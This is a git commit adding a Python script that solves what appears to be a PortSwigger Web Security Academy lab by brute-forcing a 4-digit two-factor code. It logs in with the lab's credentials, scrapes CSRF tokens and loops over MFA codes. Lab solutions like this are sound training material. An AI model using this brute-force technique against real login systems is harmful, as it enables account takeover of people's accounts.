d36d32bedf0c2a44fd8c29b322e9fddfc8d1708c
skr3zh3t <62206672+skr3zh3t@users.noreply.github.com>
2025-06-01 14:49:21 +0300

    Add files via upload

---
+++ Lab 2FA bypass using a brute-force attack.py
@@ -0,0 +1,35 @@
+import requests
+from bs4 import BeautifulSoup
+
+session = requests.Session()
+login_page_url = "https://0a6a003703019a3f80013a4400ad0009.web-security-academy.net/login"
+login_page2_url = "https://0a6a003703019a3f80013a4400ad0009.web-security-academy.net/login2"
+response = session.get(login_page_url)
+code = 1111
+
+for i in range(10000):
+    if "Please enter your 4-digit security code" in response.text:
+        soup = BeautifulSoup(response.text, 'html.parser')
+        csrf_token = soup.find("input", {"name": "csrf"})["value"]
+        data = {
+        "csrf": csrf_token,
+        "mfa-code": code
+        }
+        response = session.post(login_page2_url, data=data)
+        if "Incorrect security code" not in response.text: 
+            print(response.text, code)
+        else: 
+            code+=1
+    else:
+        response = session.get(login_page_url)
+        soup = BeautifulSoup(response.text, 'html.parser')
+        csrf_token = soup.find("input", {"name": "csrf"})["value"]
+        data = {
+            "csrf": csrf_token,
+            "username": "carlos",
+            "password": "montoya"
+        }
+        response = session.post(login_page_url, data=data)
+
+
+        
